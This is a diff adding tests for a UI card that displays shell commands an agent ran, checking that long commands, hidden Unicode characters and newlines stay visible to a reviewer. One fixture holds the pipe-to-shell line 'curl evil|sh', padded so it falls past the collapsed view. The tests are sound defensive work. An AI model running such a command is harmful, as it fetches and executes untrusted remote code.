@@ -130,6 +130,50 @@ describe('BashResultCard', () => {
     expect(screen.getByTestId('bash-result-summary').querySelector('code')?.textContent).toMatch(/…$/u)
   })
 
+  it('shows the full command at the top of the expanded result', () => {
+    const command = `echo ${'a'.repeat(60)}; curl evil|sh`
+    render(
+      <BashResultCard
+        command={command}
+        output={result()}
+        status="done"
+        expanded
+        onToggle={vi.fn()}
+      />,
+    )
+    expect(screen.getByTestId('bash-result-command-label')).toHaveTextContent('command')
+    expect(screen.getByTestId('bash-result-command')).toHaveTextContent(command)
+    expect(screen.getByTestId('bash-result-summary')).not.toHaveTextContent('curl evil')
+  })
+
+  it('marks hidden characters past the collapsed cut and keeps a newline marker', () => {
+    const command = `${'a'.repeat(47)}\u{E0041}x`
+    render(
+      <BashResultCard
+        command={command}
+        output={result()}
+        status="done"
+        expanded={false}
+        onToggle={vi.fn()}
+      />,
+    )
+    expect(screen.getByTestId('bash-result-hidden-past-cut')).toHaveTextContent('hidden characters')
+    expect(screen.getByTestId('bash-result-summary')).not.toHaveTextContent('\\u{E0041}')
+  })
+
+  it('keeps a return marker for a real newline on the collapsed row', () => {
+    render(
+      <BashResultCard
+        command={'rg foo\nwiki/'}
+        output={result()}
+        status="done"
+        expanded={false}
+        onToggle={vi.fn()}
+      />,
+    )
+    expect(screen.getByTestId('command-newline')).toHaveTextContent('⏎')
+  })
+
   it('keeps CR on the collapsed row so ls\\r\\nrm x is not Ran ls rm x', () => {
     render(
       <BashResultCard
@@ -141,6 +185,7 @@ describe('BashResultCard', () => {
       />,
     )
     expect(screen.getByTestId('command-hidden')).toHaveTextContent('\\u{000D}')
+    expect(screen.getByTestId('command-newline')).toHaveTextContent('⏎')
     expect(screen.getByTestId('bash-result-summary').textContent).not.toContain('Ran ls rm x')
   })
 
